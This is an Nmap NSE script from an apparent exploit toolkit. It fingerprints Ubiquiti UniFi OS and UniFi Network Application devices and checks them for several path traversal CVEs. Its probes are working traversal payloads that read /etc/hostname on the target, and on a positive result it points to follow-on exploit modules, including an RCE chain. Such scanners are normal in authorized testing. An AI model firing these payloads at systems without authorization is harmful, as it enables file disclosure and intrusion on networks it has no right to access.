-- embedxpl-unifi-vuln.nse
-- EmbedXPL-Forge NSE Script
-- Ubiquiti UniFi OS and UniFi Network Application CVE Fingerprinting
--
-- Author : Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: Same as Nmap -- See https://nmap.org/book/man-legal.html
--
-- DESCRIPTION:
--   Fingerprints Ubiquiti UniFi OS appliances and UniFi Network Application
--   instances, then validates active CVEs with lightweight HTTP probes.
--
--   Covered CVEs:
--     CVE-2026-34908 -- UniFi OS unauthenticated path traversal (CVSS 10.0)
--     CVE-2026-34909 -- UniFi OS JWT auth bypass via leaked signing key (CVSS 10.0)
--     CVE-2026-34910 -- UniFi OS exec endpoint RCE (CVSS 10.0)
--     CVE-2026-22557 -- UniFi Network App path traversal (CVSS 8.1)
--     CVE-2026-47368 -- UniFi OS filemanager path traversal (CVSS 8.6)
--
-- USAGE:
--   nmap -p 443,8443 --script embedxpl-unifi-vuln <target>
--   nmap -sV --script embedxpl-unifi-vuln 192.168.1.0/24

local http   = require "http"
local nmap   = require "nmap"
local stdnse = require "stdnse"
local string = require "string"
local table  = require "table"

description = [[
Fingerprints Ubiquiti UniFi OS appliances and UniFi Network Application instances.
Tests for CVE-2026-34908 (unauthenticated path traversal), CVE-2026-22557
(Network App path traversal), and CVE-2026-47368 (filemanager traversal).
Reports VULNERABLE / POSSIBLY VULNERABLE and suggests EmbedXPL-Forge modules.
]]

author     = "Andre Henrique (@mrhenrike) | Uniao Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "vuln", "safe", "discovery" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 443 or port.number == 8443 or
    port.number == 80  or port.number == 8080 or
    port.number == 8001 or port.number == 8002
  )
end

local function is_ssl(port) return port.number == 443 or port.number == 8443 or port.number == 8002 end

local function probe(host, port, path, method, body, hdrs)
  method = method or "GET"
  local opts = { header = hdrs or {}, timeout = 8000 }
  local r
  if method == "POST" then
    r = http.post(host, port, path, opts, nil, body or "")
  else
    r = http.get(host, port, path, opts)
  end
  return r
end

local UNIFI_OS_FINGERPRINTS = { "unifi-os", "UniFi OS", "ubnt", "Ubiquiti", "X-Unifi-Os", "unifi_core" }
local UNIFI_NET_FINGERPRINTS = { "UniFi Network", "UniFi-Application", "X-Unifi-Application" }

local function contains_any(s, patterns)
  for _, p in ipairs(patterns) do
    if string.find(s, p, 1, true) then return true end
  end
  return false
end

local function check_path_traversal_34908(host, port)
  local path = "/api/self/properties/download?path=%2F..%2F..%2F..%2Fetc/hostname"
  local r = probe(host, port, path)
  if r and r.status == 200 and #(r.body or "") > 0 then
    return "VULNERABLE -- path traversal confirmed (read /etc/hostname)"
  end
  return "CHECK MANUALLY"
end

local function check_filemanager_47368(host, port)
  local path = "/dl/filemanager?name=%252F..%252F..%252F..%252Fetc/hostname"
  local r = probe(host, port, path)
  if r and r.status == 200 and #(r.body or "") > 0 then
    return "VULNERABLE -- filemanager double-encoded traversal confirmed"
  end
  return "CHECK MANUALLY"
end

local function check_network_traversal_22557(host, port)
  local path = "/api/s/default/stat/config-export?file=../../../../../../etc/hostname"
  local r = probe(host, port, path)
  if r and r.status == 200 and #(r.body or "") > 0 then
    return "VULNERABLE -- Network App path traversal confirmed"
  end
  return "NOT CONFIRMED"
end

action = function(host, port)
  local output = {}
  local ssl = is_ssl(port)

  -- Fingerprint
  local r = probe(host, port, "/api/self/status")
  if not r then r = probe(host, port, "/") end
  if not r then return nil end

  local body = r.body or ""
  local hdrs = tostring(r.header or "")
  local is_unifi_os  = contains_any(body .. hdrs, UNIFI_OS_FINGERPRINTS)
  local is_unifi_net = contains_any(body .. hdrs, UNIFI_NET_FINGERPRINTS)

  if not is_unifi_os and not is_unifi_net then return nil end

  if is_unifi_os then
    table.insert(output, "Device : Ubiquiti UniFi OS Appliance")
    -- CVE-2026-34908
    local res_34908 = check_path_traversal_34908(host, port)
    table.insert(output, "CVE-2026-34908 (Path Traversal CVSS 10.0) : " .. res_34908)
    -- CVE-2026-47368
    local res_47368 = check_filemanager_47368(host, port)
    table.insert(output, "CVE-2026-47368 (Filemanager Traversal CVSS 8.6) : " .. res_47368)
    if string.find(res_34908, "VULNERABLE", 1, true) then
      table.insert(output, "EmbedXPL chain : use exploits/routers/ubiquiti/unifi_os_rce_chain_cve_2026_34908")
    end
  end

  if is_unifi_net then
    table.insert(output, "Device : Ubiquiti UniFi Network Application")
    local res_22557 = check_network_traversal_22557(host, port)
    table.insert(output, "CVE-2026-22557 (Network App Path Traversal CVSS 8.1) : " .. res_22557)
    if string.find(res_22557, "VULNERABLE", 1, true) then
      table.insert(output, "EmbedXPL module : use exploits/routers/ubiquiti/unifi_network_path_traversal_cve_2026_22557")
    end
  end

  table.insert(output, "Suite : embedxpl > use <module above>")
  return stdnse.format_output(true, output)
end
